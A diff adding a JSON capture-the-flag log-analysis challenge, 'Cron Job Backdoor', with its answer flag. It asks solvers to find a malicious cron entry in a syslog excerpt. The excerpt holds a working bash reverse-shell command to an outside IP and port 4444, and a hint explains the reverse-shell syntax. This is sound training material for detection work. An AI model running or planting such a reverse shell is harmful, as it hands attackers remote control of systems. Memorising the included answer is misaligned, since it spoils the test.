@@ -1,0 +1,19 @@
+{
+  "id": "logs-suspicious-001",
+  "title": "Cron Job Backdoor",
+  "category": "log-analysis",
+  "difficulty": "hard",
+  "points": 400,
+  "description": "Review this syslog excerpt from a compromised Linux server. What command did the attacker schedule in cron?\n\nJan 10 03:00:01 server CRON[5678]: (root) CMD (/usr/bin/find /tmp -name '*.log' -delete)\nJan 10 03:15:01 server CRON[5679]: (www-data) CMD (/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1')\nJan 10 03:30:01 server CRON[5680]: (root) CMD (/usr/sbin/logrotate /etc/logrotate.conf)\nJan 10 03:45:01 server CRON[5681]: (root) CMD (/usr/bin/apt-get update -q)\n\nWhich cron entry is the reverse shell backdoor, and what port does it connect to?\n\nSubmit as: flag{port_number}",
+  "flag": "flag{4444}",
+  "hints": [
+    "Look for network connections in cron — that's unusual",
+    "The /dev/tcp/ path is a bash special file for network connections",
+    "bash -i >& /dev/tcp/IP/PORT creates an interactive reverse shell"
+  ],
+  "resources": [
+    "https://www.revshells.com/",
+    "https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/"
+  ],
+  "ncl_category": "Log Analysis"
+}
